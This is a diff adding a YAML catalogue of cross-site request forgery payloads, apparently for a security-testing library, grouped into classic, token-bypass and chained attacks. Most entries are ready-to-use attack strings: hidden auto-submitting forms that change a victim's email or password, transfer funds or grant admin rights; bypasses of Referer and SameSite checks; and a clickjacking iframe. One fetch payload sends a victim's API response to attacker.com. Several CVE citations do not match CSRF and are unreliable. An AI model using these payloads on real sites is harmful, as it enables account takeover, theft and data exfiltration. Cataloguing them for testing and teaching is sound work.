@@ -1,0 +1,371 @@
+slug: csrf
+name: Cross-Site Request Forgery (CSRF)
+owasp: A01:2021 – Broken Access Control
+description: 'CSRF tricks an authenticated victim''s browser into sending forged requests to a web application. Since the
+  browser automatically attaches session cookies to same-origin requests, the application cannot distinguish a forged request
+  from a legitimate one without a separate secret token. Successful CSRF attacks perform actions on behalf of the victim,
+  including password changes, fund transfers, and account modifications.
+
+  '
+severity_range:
+  low: CVSS 4.3
+  high: CVSS 8.8
+references:
+- label: OWASP CSRF Prevention Cheat Sheet
+  url: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
+- label: PortSwigger CSRF Research
+  url: https://portswigger.net/web-security/csrf
+groups:
+- slug: classic-csrf
+  name: Classic GET/POST CSRF
+  description: Standard CSRF attacks using HTML forms and img tags to forge state-changing requests.
+  difficulty: low
+  prerequisites:
+  - No CSRF token required for state-changing requests
+  - Session maintained via cookies with no SameSite attribute
+  payloads:
+  - id: csrf-classic-001
+    title: GET-based CSRF via img tag
+    payload_string: <img src="https://victim.com/api/delete-account?confirm=true" style="display:none">
+    how_it_works: 'Browsers automatically make GET requests for img src attributes when loading pages. If a state-changing
+      action is available via GET (a design flaw), embedding an img tag on an attacker page causes the victim''s browser to
+      send the authenticated request automatically when they visit. The victim''s session cookies are attached automatically.
+      The request is completely invisible since the img element is hidden. No user interaction beyond visiting the malicious
+      page is required.
+
+      '
+    prerequisites:
+    - State-changing action available via HTTP GET
+    - Session cookie without SameSite attribute
+    - No CSRF token required
+    waf_bypass_notes: GET-based CSRF only; proper REST design uses POST for mutations
+    severity_context: CVSS 8.8 – automatic account deletion via one-click CSRF
+    cve_refs:
+    - CVE-2020-11022
+    tags:
+    - csrf
+    - get-based
+    - img-tag
+    - no-interaction
+    - basic
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: csrf-classic-002
+    title: Auto-submitting POST form
+    payload_string: "<form action=\"https://victim.com/api/change-email\" method=\"POST\" id=\"csrf\">\n  <input type=\"hidden\"\
+      \ name=\"email\" value=\"attacker@evil.com\">\n</form>\n<script>document.getElementById('csrf').submit();</script>\n"
+    how_it_works: 'An HTML form targeting the victim application with pre-filled malicious values submits automatically via
+      JavaScript. When the victim visits the attacker''s page, the script immediately submits the form with the attacker''s
+      email address as the new email, changing the victim''s account email without their knowledge. The form submission is
+      a cross-origin request, but the browser attaches the victim''s session cookies since they''re on the victim''s domain.
+      Account takeover follows via password reset to the new email.
+
+      '
+    prerequisites:
+    - POST endpoint for email change with no CSRF token
+    - Session cookie without SameSite=Strict attribute
+    waf_bypass_notes: Form auto-submission is native browser behavior; hard to block without CSRF tokens
+    severity_context: CVSS 8.0 – account takeover via email change CSRF
+    cve_refs: []
+    tags:
+    - csrf
+    - post-form
+    - auto-submit
+    - account-takeover
+    - email-change
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: csrf-classic-003
+    title: Password change CSRF
+    payload_string: "<form action=\"https://victim.com/account/change-password\" method=\"POST\" id=\"pwchange\">\n  <input\
+      \ type=\"hidden\" name=\"new_password\" value=\"hacked123\">\n  <input type=\"hidden\" name=\"confirm_password\" value=\"\
+      hacked123\">\n</form>\n<script>document.getElementById('pwchange').submit();</script>\n"
+    how_it_works: 'This CSRF payload targets a password change endpoint that does not require the current password and has
+      no CSRF protection. After the victim visits the attacker''s page and the form auto-submits, the victim''s password is
+      changed to ''hacked123''. The attacker immediately logs in with the new password. This is the most impactful CSRF —
+      it results in direct account compromise that persists even after the victim ends their session. Applications that require
+      the current password for changes are not vulnerable to this specific form.
+
+      '
+    prerequisites:
+    - Password change without requiring current password
+    - No CSRF token on password change endpoint
+    waf_bypass_notes: Requires old-password field to be absent or ignorable
+    severity_context: CVSS 8.8 – direct account takeover via password change CSRF
+    cve_refs:
+    - CVE-2020-11022
+    tags:
+    - csrf
+    - password-change
+    - account-takeover
+    - high-impact
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: csrf-classic-004
+    title: Funds transfer CSRF
+    payload_string: "<form action=\"https://bank.victim.com/transfer\" method=\"POST\" id=\"t\">\n  <input type=\"hidden\"\
+      \ name=\"amount\" value=\"10000\">\n  <input type=\"hidden\" name=\"to_account\" value=\"ATTACKER_ACCOUNT\">\n  <input\
+      \ type=\"hidden\" name=\"currency\" value=\"USD\">\n</form>\n<script>document.getElementById('t').submit();</script>\n"
+    how_it_works: 'Financial applications without CSRF protection on transfer endpoints are susceptible to unauthorized fund
+      transfers. When an authenticated banking customer visits the attacker''s page, the form submits with their credentials
+      attached, transferring funds to the attacker''s account. The victim has no visual indication the transfer occurred.
+      This class of CSRF has been exploited in real banking attacks and is covered by numerous CVEs in financial application
+      libraries. CSRF tokens and SameSite cookies are the primary defenses.
+
+      '
+    prerequisites:
+    - Financial application without CSRF protection on transfer endpoint
+    - Authentication via cookies (not API keys or tokens in headers)
+    waf_bypass_notes: Bank transfers are high-value CSRF targets; confirm SameSite cookie attribute first
+    severity_context: CVSS 8.8 – unauthorized fund transfer via CSRF on financial application
+    cve_refs: []
+    tags:
+    - csrf
+    - financial
+    - transfer
+    - high-impact
+    - banking
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: csrf-classic-005
+    title: Admin privilege escalation CSRF
+    payload_string: "<form action=\"https://victim.com/admin/users/123/role\" method=\"POST\" id=\"priv\">\n  <input type=\"\
+      hidden\" name=\"role\" value=\"admin\">\n  <input type=\"hidden\" name=\"_method\" value=\"PUT\">\n</form>\n<script>document.getElementById('priv').submit();</script>\n"
+    how_it_works: 'If an administrator visits a malicious page while logged in, a CSRF attack can grant attacker-controlled
+      accounts admin privileges. The form targets the user role change endpoint, setting user 123 (the attacker''s account)
+      to admin role. The _method override is used for frameworks that support HTTP method tunneling via POST. Once the admin
+      unknowingly submits this CSRF, the attacker''s account has full administrative access to the application, potentially
+      affecting all users.
+
+      '
+    prerequisites:
+    - Admin role change endpoint vulnerable to CSRF
+    - Administrator visits malicious page while authenticated
+    waf_bypass_notes: Target admin actions; combine with social engineering for delivery
+    severity_context: CVSS 8.8 – privilege escalation to admin via CSRF targeting admin users
+    cve_refs: []
+    tags:
+    - csrf
+    - privilege-escalation
+    - admin
+    - role-change
+    - high-impact
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: csrf-bypass
+  name: CSRF Token Bypass
+  description: Techniques for bypassing CSRF token implementations with weaknesses in token generation, validation, or transmission.
+  difficulty: high
+  prerequisites:
+  - CSRF token implemented but with weaknesses
+  payloads:
+  - id: csrf-bypass-001
+    title: CSRF token removal bypass
+    payload_string: 'POST /account/change-email HTTP/1.1
+
+      Host: victim.com
+
+
+      email=attacker@evil.com'
+    how_it_works: 'Some applications include a CSRF token in forms but only validate it when present. If the token parameter
+      is entirely removed from the request (rather than submitting an invalid token), the server-side validation code may
+      not execute, accepting the request as valid. This occurs when the validation logic is: ''if token present, validate;
+      else continue''. Testing by simply omitting the CSRF token parameter reveals this common implementation flaw. This is
+      one of the most frequently found CSRF implementation vulnerabilities.
+
+      '
+    prerequisites:
+    - Server validates token only if present, not if absent
+    - CSRF token parameter can be removed
+    waf_bypass_notes: Remove _token, csrf_token, _csrf, or similar parameters from the request
+    severity_context: CVSS 8.0 – CSRF token validation bypass via parameter removal
+    cve_refs: []
+    tags:
+    - csrf
+    - token-bypass
+    - validation-bypass
+    - parameter-removal
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: csrf-bypass-002
+    title: CSRF token sharing across users
+    payload_string: csrf_token=ATTACKER_OWN_TOKEN
+    how_it_works: 'If CSRF tokens are not tied to a specific user session but are globally valid, an attacker can obtain their
+      own CSRF token and use it in a CSRF attack against other users. The attacker registers an account, extracts their CSRF
+      token from the form, and embeds it in the malicious CSRF page. The victim''s request includes the attacker''s valid
+      token, which passes validation. Proper CSRF tokens must be tied to the specific session submitting the request.
+
+      '
+    prerequisites:
+    - CSRF tokens valid for any user (not session-tied)
+    - Attacker can obtain a valid token from their own account
+    waf_bypass_notes: Extract your own token; embed in CSRF PoC; test if accepted for other users
+    severity_context: CVSS 8.0 – CSRF bypass via token reuse across user sessions
+    cve_refs: []
+    tags:
+    - csrf
+    - token-bypass
+    - cross-user-token
+    - session-binding
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: csrf-bypass-003
+    title: JSON CSRF with text/plain content type
+    payload_string: "<form action=\"https://victim.com/api/update\" method=\"POST\" enctype=\"text/plain\" id=\"jcsrf\">\n\
+      \  <input type=\"hidden\" name=\"{&quot;user&quot;:&quot;attacker&quot;, &quot;role&quot;:&quot;admin&quot;, &quot;ignore&quot;:\"\
+      \ value=\"&quot;}\">\n</form>\n<script>document.getElementById('jcsrf').submit();</script>\n"
+    how_it_works: 'JSON APIs that check for Content-Type: application/json for CORS protection may be bypassed using text/plain.
+      The form uses enctype=text/plain, which submits the body as key=value with no encoding. By carefully crafting the name
+      attribute as the start of a JSON object and the value as the end, the submitted body is valid JSON. Since text/plain
+      is a simple request that doesn''t trigger a CORS preflight, the cross-origin POST succeeds. APIs that accept JSON with
+      text/plain content type are vulnerable.
+
+      '
+    prerequisites:
+    - API accepts JSON body regardless of Content-Type
+    - No CSRF token required for JSON endpoints
+    waf_bypass_notes: text/plain avoids CORS preflight; effective against JSON APIs
+    severity_context: CVSS 8.0 – CSRF against JSON API via content type bypass
+    cve_refs: []
+    tags:
+    - csrf
+    - json-api
+    - content-type-bypass
+    - cors-bypass
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: csrf-bypass-004
+    title: Referrer header CSRF bypass
+    payload_string: https://victim.com.attacker.com/csrf-page
+    how_it_works: 'Some applications validate the Referer header as a CSRF protection mechanism, checking that the request
+      originated from the same domain. A filter checking if the Referer contains ''victim.com'' can be bypassed by using victim.com
+      as a subdomain of the attacker''s domain (victim.com.attacker.com). The filter''s contains() check matches, but the
+      actual origin is attacker.com. Alternatively, removing the Referer header entirely bypasses applications that only validate
+      when Referer is present.
+
+      '
+    prerequisites:
+    - Application uses Referer header (not CSRF token) for protection
+    - Referer validation uses contains() rather than exact domain match
+    waf_bypass_notes: Create attacker domain as victim.com.evil.com subdomain for contains-bypass
+    severity_context: CVSS 7.5 – Referer-based CSRF protection bypass
+    cve_refs: []
+    tags:
+    - csrf
+    - referer-bypass
+    - domain-confusion
+    - filter-bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: csrf-bypass-005
+    title: SameSite=Lax method override CSRF
+    payload_string: '<a href="https://victim.com/api/action?param=malicious&_method=POST">Click me for prize!</a>
+
+      '
+    how_it_works: 'SameSite=Lax cookies are sent for top-level navigation GET requests but not cross-site POST requests. However,
+      applications that support HTTP method override (e.g., Sinatra, Rails) allow embedding _method=POST in GET requests.
+      A top-level navigation to such a URL with the method override sends cookies (Lax allows GET navigation) while the application
+      processes it as a POST. This bypasses SameSite=Lax protection for applications supporting method override, which includes
+      many REST frameworks.
+
+      '
+    prerequisites:
+    - Application supports _method GET parameter for HTTP verb override
+    - Session cookie uses SameSite=Lax (not Strict)
+    waf_bypass_notes: Rails, Sinatra, and other frameworks support _method override by default
+    severity_context: CVSS 7.5 – SameSite=Lax bypass via HTTP method override
+    cve_refs: []
+    tags:
+    - csrf
+    - samesite-bypass
+    - method-override
+    - lax
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: csrf-chaining
+  name: CSRF Chaining and Advanced Techniques
+  description: Combining CSRF with other vulnerabilities (XSS, CORS, clickjacking) for enhanced impact.
+  difficulty: expert
+  prerequisites:
+  - CSRF vulnerability confirmed
+  - Secondary vulnerability available for chaining
+  payloads:
+  - id: csrf-chain-001
+    title: XSS + CSRF for authenticated action
+    payload_string: fetch('/api/admin/create-user',{method:'POST',body:JSON.stringify({username:'attacker',password:'P@ssw0rd!',role:'admin'}),headers:{'Content-Type':'application/json'},credentials:'include'})
+    how_it_works: 'When a CSRF token is present and validated, XSS on the victim''s browser bypasses it completely. JavaScript
+      running in the victim''s origin can read the CSRF token from the DOM and include it in programmatic fetch requests.
+      The same-origin policy allows JavaScript to read all page content including CSRF tokens. This chain uses stored or reflected
+      XSS to extract the CSRF token and perform authenticated API actions on behalf of the victim. XSS completely defeats
+      CSRF token protections.
+
+      '
+    prerequisites:
+    - XSS vulnerability on the same origin
+    - CSRF token readable from DOM
+    waf_bypass_notes: XSS defeats CSRF tokens; prioritize XSS testing on high-privilege pages
+    severity_context: CVSS 9.3 – XSS defeats CSRF protection for complete account takeover
+    cve_refs:
+    - CVE-2020-11022
+    tags:
+    - csrf
+    - xss-chain
+    - csrf-token-bypass
+    - same-origin
+    - admin-creation
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: csrf-chain-002
+    title: Clickjacking CSRF delivery
+    payload_string: <iframe src="https://victim.com/account/delete" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>
+    how_it_works: 'Clickjacking overlays an invisible iframe containing the victim application on top of a decoy page. When
+      the victim clicks what appears to be a button on the decoy page, they actually click a button in the invisible victim
+      application iframe. If the victim is authenticated, the click performs the authenticated action (delete account, confirm
+      transfer). Unlike form-based CSRF, clickjacking works even when CSRF tokens are present, as the legitimate form is submitted
+      via the victim''s own click.
+
+      '
+    prerequisites:
+    - Victim application not protected by X-Frame-Options or CSP frame-ancestors
+    - Actionable button aligns with decoy click target
+    waf_bypass_notes: 'Requires X-Frame-Options: DENY or CSP frame-ancestors to be absent'
+    severity_context: CVSS 8.0 – clickjacking-delivered CSRF bypassing token protection
+    cve_refs:
+    - CVE-2020-11022
+    tags:
+    - csrf
+    - clickjacking
+    - iframe
+    - x-frame-options
+    - user-interaction
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: csrf-chain-003
+    title: CORS misconfiguration CSRF for JSON API
+    payload_string: "fetch('https://victim.com/api/sensitive-action', {\n  method: 'POST',\n  credentials: 'include',\n  headers:\
+      \ {'Content-Type': 'application/json'},\n  body: JSON.stringify({action: 'transfer', amount: 5000})\n}).then(r => r.json()).then(d\
+      \ => fetch('https://attacker.com/?d='+JSON.stringify(d)));\n"
+    how_it_works: 'When a web application has a permissive CORS policy (Access-Control-Allow-Origin: * or reflecting the Origin
+      header with Allow-Credentials: true), cross-origin JavaScript on the attacker''s page can make authenticated API requests
+      and read the responses. This JavaScript sends an authenticated API request to victim.com with the victim''s cookies,
+      then exfiltrates the response to the attacker. This effectively turns CORS misconfiguration into a CSRF with response
+      reading, bypassing the same-origin policy restriction on reading cross-origin responses.
+
+      '
+    prerequisites:
+    - 'CORS policy reflects arbitrary origins with credentials: true'
+    - Victim authenticated to the application
+    waf_bypass_notes: CORS misconfig is required; test Access-Control-Allow-Origin header
+    severity_context: CVSS 8.8 – CORS misconfiguration enabling CSRF with response reading
+    cve_refs:
+    - CVE-2019-11358
+    tags:
+    - csrf
+    - cors-chain
+    - cors-misconfig
+    - json-api
+    - response-reading
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
